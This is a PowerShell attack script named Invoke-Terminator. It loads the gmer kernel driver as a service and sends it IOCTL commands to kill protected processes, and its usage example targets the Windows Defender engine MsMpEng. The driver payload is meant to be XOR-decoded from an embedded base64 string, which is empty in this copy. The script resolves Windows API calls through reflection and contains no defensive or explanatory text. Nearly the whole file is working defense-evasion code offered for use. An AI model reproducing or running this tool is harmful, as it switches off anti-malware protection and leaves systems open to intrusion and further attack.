function Invoke-Terminator
{
<#
.DESCRIPTION

This script can terminate protected processes such as anti-malware by loading the gmer driver.

.PARAMETER ServiceName

The name of the service that is created in the system

.PARAMETER driverPath

The path where gmer driver is extracted. By default, it is saved in the temp folder of the current user.

.EXAMPLE

Invoke-Terminator -ProcName MsMpEng
#>

    [CmdletBinding()]
    Param
    (
        [String]
        $ServiceName = "terminator",

        [Int32]
        $ProcId,

        [String]
        $ProcName,

        [String]
        $driverPath = [System.IO.Path]::GetTempPath() +  "terminator.sys"

    )

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    return $TypeBuilder.CreateType()
}

function Get-Win32Constants
{
    $Win32Constants = New-Object System.Object

    $Win32Constants | Add-Member -MemberType NoteProperty -Name SC_MANAGER_ALL_ACCESS -Value 0xF003F
    $Win32Constants | Add-Member -MemberType NoteProperty -Name SERVICE_ALL_ACCESS -Value 0xF01FF
    $Win32Constants | Add-Member -MemberType NoteProperty -Name SERVICE_KERNEL_DRIVER -Value 0x00000001
    $Win32Constants | Add-Member -MemberType NoteProperty -Name SERVICE_DEMAND_START -Value 0x00000003
    $Win32Constants | Add-Member -MemberType NoteProperty -Name SERVICE_ERROR_IGNORE -Value 0x00000000
    $Win32Constants | Add-Member -MemberType NoteProperty -Name SERVICE_STOPPED -Value 0x00000001
    $Win32Constants | Add-Member -MemberType NoteProperty -Name SERVICE_RUNNING -Value 0x00000004
    $Win32Constants | Add-Member -MemberType NoteProperty -Name SERVICE_PAUSED -Value 0x00000007
    $Win32Constants | Add-Member -MemberType NoteProperty -Name GENERIC_WRITE -Value 0x40000000
    $Win32Constants | Add-Member -MemberType NoteProperty -Name GENERIC_READ -Value 0x80000000
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OPEN_EXISTING -Value 0x3
    $Win32Constants | Add-Member -MemberType NoteProperty -Name FILE_ATTRIBUTE_NORMAL -Value 0x80

    return $Win32Constants
}

function Get-Win32Types
{
    $Win32Types = New-Object System.Object

    $Domain = [AppDomain]::CurrentDomain
    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)

    $Attributes = 'Public, SequentialLayout, AnsiClass, AutoLayout, BeforeFieldInit'
    $TypeBuilder = $ModuleBuilder.DefineType('SERVICE_STATUS', $Attributes, [System.ValueType])
    $TypeBuilder.DefineField('dwServiceType', [int], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwCurrentState', [int], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwControlsAccepted', [int], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwWin32ExitCode', [int], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwServiceSpecificExitCode', [int], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwCheckPoint', [int], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwWaitHint', [int], 'Public') | Out-Null
    $SERVICE_STATUS = $TypeBuilder.CreateType()
    $Win32Types | Add-Member -MemberType NoteProperty -Name SERVICE_STATUS -Value $SERVICE_STATUS

    return $Win32Types
}

function Get-Win32Functions
{
    $Win32Functions = New-Object System.Object

    $OpenSCManagerAddr = Get-ProcAddress advapi32.dll OpenSCManagerA;
    $OpenSCManagerDelegate = Get-DelegateType @([String], [String], [UInt32]) ([IntPtr]);
    $OpenSCManager = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAddr, $OpenSCManagerDelegate);
    $Win32Functions | Add-Member NoteProperty -Name OpenSCManager -Value $OpenSCManager

    $OpenServiceAddr = Get-ProcAddress advapi32.dll OpenServiceA;
    $OpenServiceDelegate = Get-DelegateType @([IntPtr], [String], [UInt32]) ([IntPtr]);
    $OpenService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAddr, $OpenServiceDelegate);
    $Win32Functions | Add-Member NoteProperty -Name OpenService -Value $OpenService

    $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
    $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
    $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate) 
    $Win32Functions | Add-Member NoteProperty -Name CloseServiceHandle -Value $CloseServiceHandle

    $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
    $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
    $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)
    $Win32Functions | Add-Member NoteProperty -Name CreateServiceA -Value $CreateServiceA

    $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
    $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])
    $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)
    $Win32Functions | Add-Member NoteProperty -Name StartServiceA -Value $StartServiceA

    $CreateFileAAddr = Get-ProcAddress kernel32.dll CreateFileA
    $CreateFileADelegate = Get-DelegateType @( [String], [Int], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr]) ([IntPtr])
    $CreateFileA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateFileAAddr, $CreateFileADelegate)
    $Win32Functions | Add-Member NoteProperty -Name CreateFileA -Value $CreateFileA

    $DeviceIoControlAddr = Get-ProcAddress kernel32.dll DeviceIoControl
    $DeviceIoControlDelegate = Get-DelegateType @( [IntPtr], [Int64], [byte[]], [UInt32], [byte[]], [UInt32], [UInt32].MakeByRefType(), [IntPtr]) ([bool])
    $DeviceIoControl = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeviceIoControlAddr, $DeviceIoControlDelegate)
    $Win32Functions | Add-Member NoteProperty -Name DeviceIoControl -Value $DeviceIoControl

    $QueryServiceStatusAddr = Get-ProcAddress advapi32.dll QueryServiceStatus
    $QueryServiceStatusDelegate = Get-DelegateType @( [IntPtr], [IntPtr]) ([bool])
    $QueryServiceStatus = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($QueryServiceStatusAddr, $QueryServiceStatusDelegate)
    $Win32Functions | Add-Member NoteProperty -Name QueryServiceStatus -Value $QueryServiceStatus

    return $Win32Functions
}

function Extract-Driver {
    Write-Host '[*] Extract the driver in:', $driverPath

    $base64String = ""
    $bytes = [Convert]::FromBase64String($base64String)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor 85
    }
    [IO.File]::WriteAllBytes($driverPath, $bytes)
    Write-Host '[*] End of driver extraction.'
}

function Main
{
    Write-Host '----------------------------'
    Write-Host "`tTerminator`n"
    Write-Host 'github : github.com/xiosec'
    Write-Host 'twitter: twitter.com/xiosec'
    Write-Host '----------------------------'

    if($ProcId -le 1 -And $ProcName -eq ""){
        Write-Host '[*] The name or ID of the process is required!';
        return
    }

    if($ProcName -ne ""){
        $ProcId = (Get-Process -Name $ProcName -ErrorAction Ignore).Id
        if($ProcId -le 0){
            Write-Host '[*] There is no process with this name!';
            return
        }
        Write-Host '[*] Process Id: ', $ProcId
    }
    if ((Get-Process -Id $ProcId -ErrorAction Ignore) -eq $null){
           Write-Host '[*] There is no process with this id!'
           return
    }

    $Win32Types = Get-Win32Types
    $Win32Functions = Get-Win32Functions
    $Win32Constants = Get-Win32Constants

    $hSCM = $Win32Functions.OpenSCManager.Invoke('.', 'ServicesActive', $Win32Constants.SC_MANAGER_ALL_ACCESS);
    if ($hSCM -eq [System.IntPtr]::Zero) {
        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host '[*] Failed to open SCM handle. Error code: $errorCode'
        $_ = $Win32Functions.CloseServiceHandle.Invoke($hSCM)
        return
    }
    $hService = $Win32Functions.OpenService.Invoke($hSCM, $ServiceName, $Win32Constants.SERVICE_ALL_ACCESS)
    if ($hService -ne [System.IntPtr]::Zero){
        Write-Host '[*] Service already exists.'

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [IntPtr]$Service_StatusPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)

        if ($Win32Functions.QueryServiceStatus.Invoke($hService, $Service_StatusPtr)){
            $Service_Status = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Service_StatusPtr, [Type]$Win32Types.SERVICE_STATUS)

            if ($Service_Status.dwCurrentState -eq $Win32Constants.SERVICE_RUNNING){
                Write-Host "  \___STATE: 0x00000004 (RUNNING)"
            }
            elseif($Service_Status.dwCurrentState -eq $Win32Constants.SERVICE_STOPPED){
                Write-Host "  \___STATE: 0x00000001 (STOPPED)"
                $status = $Win32Functions.StartServiceA.Invoke($hService, $null, $null)
                if ($status -ne [System.IntPtr]::Zero){
                    Write-Host '[*] Restart the service!'
                }else{
                    Write-Host '[*] Failure to start the service!'
                    $Win32Functions.CloseServiceHandle.Invoke($hSCM)
                    $Win32Functions.CloseServiceHandle.Invoke($hService)
                    return
                }
            }

        }else{
            Write-Host '[*] Failed to query service status!'
        }
    }

    if ($hService -eq [System.IntPtr]::Zero){
        Extract-Driver

        $hService = $Win32Functions.CreateServiceA.Invoke(
            $hSCM,
            $ServiceName,
            $ServiceName,
            $Win32Constants.SERVICE_ALL_ACCESS,
            $Win32Constants.SERVICE_KERNEL_DRIVER,
            $Win32Constants.SERVICE_DEMAND_START,
            $Win32Constants.SERVICE_ERROR_IGNORE,
            $driverPath,
            $null,
            $null,
            $null,
            $null,
            $null
        )
        if ($hService -eq [System.IntPtr]::Zero){
            Write-Host '[*] The driver failed to load!'
            $Win32Functions.CloseServiceHandle.Invoke($hSCM)
            $Win32Functions.CloseServiceHandle.Invoke($hService)
            return
        }

        Write-Host '[*] Service created successfully.'
        $status = $Win32Functions.StartServiceA.Invoke($hService, $null, $null)
        if ($status -ne [System.IntPtr]::Zero){
            Write-Host '[*] Starting service'
        }else{
            Write-Host '[*] Failure to start the service!'
            $Win32Functions.CloseServiceHandle.Invoke($hSCM)
            $Win32Functions.CloseServiceHandle.Invoke($hService)
            return
        }
    }
    $Win32Functions.CloseServiceHandle.Invoke($hSCM)
    $Win32Functions.CloseServiceHandle.Invoke($hService)

    $hDevice = [IntPtr]::Zero
    $lpFileName = ("\\.\", $ServiceName) -join ''

    $hDevice = $Win32Functions.CreateFileA.Invoke($lpFileName, $Win32Constants.GENERIC_WRITE -bor $Win32Constants.GENERIC_READ, 0, [IntPtr]::Zero, $Win32Constants.OPEN_EXISTING, $Win32Constants.FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero)

    if ($hDevice -eq -1) {
        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[*] Failed to create file handle. Error code: $errorCode"
        return
    }

    $INITIALIZE_IOCTL_CODE = 0x9876C004
    $TERMINSTE_PROCESS_IOCTL_CODE = 0x9876C094
    $input = [BitConverter]::GetBytes($ProcId)
    $output = @(0,0)
    $BytesReturned = [UInt32] 0

    $Win32Functions.DeviceIoControl.Invoke($hDevice, $INITIALIZE_IOCTL_CODE, $input, $input.Length, $output, $output.Length, [Ref]$BytesReturned, 0)
    [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

    $result =  $Win32Functions.DeviceIoControl.Invoke($hDevice, $TERMINSTE_PROCESS_IOCTL_CODE, $input, $input.Length, $output, $output.Length, [Ref]$BytesReturned, 0)
    if(!$result){
        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "Failed to DeviceIoControl. Error code: $errorCode"
        $Win32Functions.CloseServiceHandle.Invoke($hDevice)
        return
    }
    Write-Host '[*] The process ended successfully'
    $Win32Functions.CloseServiceHandle.Invoke($hDevice)
}
    Main | Out-Null
}